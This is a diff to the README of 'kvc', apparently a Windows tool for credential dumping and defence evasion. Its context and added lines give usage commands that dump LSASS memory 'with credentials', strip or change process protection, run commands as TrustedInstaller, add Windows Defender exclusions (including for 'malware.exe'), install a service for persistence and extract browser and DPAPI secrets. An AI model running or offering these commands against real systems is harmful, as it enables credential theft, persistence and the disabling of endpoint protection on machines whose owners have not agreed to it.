@@ -205,7 +205,7 @@ procdump.exe -ma lsass.exe lsass.dmp
 # Result: Access Denied (0x80070005)
 
 # KVC approach (SUCCEEDS)
-kvc.exe dump lsass C:\forensics\
+kvc.exe dump lsass
 # Result: Full memory dump with credentials
 ```
 
@@ -594,10 +594,11 @@ kvc.exe list
 
 # Query specific process protection status
 kvc.exe get lsass.exe
-kvc.exe info 1234
+kvc.exe info MsMpEng.exe
 
 # Apply protection to unprotected process  
 kvc.exe protect notepad.exe PPL Windows
+kvc protect total PPL WinTcb
 
 # Force protection level change (overwrites existing)
 kvc.exe set 5678 PP WinTcb
@@ -615,10 +616,10 @@ kvc.exe unprotect all
 kvc.exe dump lsass
 
 # Dump specific PID to custom location
-kvc.exe dump 1044 C:\forensics\dumps\
+kvc.exe dump 1044 C:\Windows\Temp
 
 # Dump by process name with custom path
-kvc.exe dump chrome.exe D:\analysis\
+kvc.exe dump chrome.exe D:\path
 ```
 
 ### Advanced System Integration
@@ -631,16 +632,24 @@ kvc.exe shift
 kvc.exe unshift  
 
 # Execute command with TrustedInstaller privileges
-kvc.exe trusted "powershell Get-MpPreference"
+kvc.exe trusted cmd
+kvc trusted Shortcut.lnk
 
 # Add Windows Defender exclusions
-kvc.exe add-exclusion Paths C:\Tools\
+kvc.exe add-exclusion Paths C:\Tools
 kvc.exe add-exclusion Processes malware.exe
 kvc.exe add-exclusion Extensions .dmp
 
 # Install as NT service for persistence
 kvc.exe install
+kvc.exe service status
+kvc.exe service stop
 kvc.exe service start
+kvc.exe uninstall
+
+#Auto-install to System32 + Windows Defender exclusions
+kvc setup
+
 ```
 
 ### Browser Credential Extraction
@@ -653,7 +662,7 @@ kvc.exe bp --chrome -o C:\extracted\
 kvc.exe bp --chrome --brave --edge
 
 # DPAPI-based extraction (legacy method)
-kvc.exe export secrets C:\dpapi\
+kvc.exe export secrets C:\dpapi
 ```
 
 ### Service Management (Advanced Deployment)
